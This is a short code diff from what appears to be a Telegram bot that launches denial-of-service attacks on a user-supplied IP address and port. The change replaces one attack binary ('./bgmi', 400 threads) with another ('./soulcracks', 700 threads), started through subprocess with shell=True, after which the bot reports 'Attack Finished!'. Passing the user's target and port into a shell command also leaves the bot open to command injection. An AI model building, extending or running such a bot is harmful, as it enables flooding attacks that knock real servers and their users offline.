@@ -243,7 +243,7 @@ def handle_attack(message):
                 else:
                     user_last_attack[user_id] = time.time()
                     start_attack_reply(message, target, port, time_duration)
-                    full_command = f"./bgmi {target} {port} {time_duration} 400"
+                    full_command = f"./soulcracks {target} {port} {time_duration} 700"
                     subprocess.run(full_command, shell=True)
 
                     response = f"🎯 **Attack Finished!**\n**Target:** `{target}`\n**Port:** `{port}`\n**Duration:** `{time_duration} seconds`"
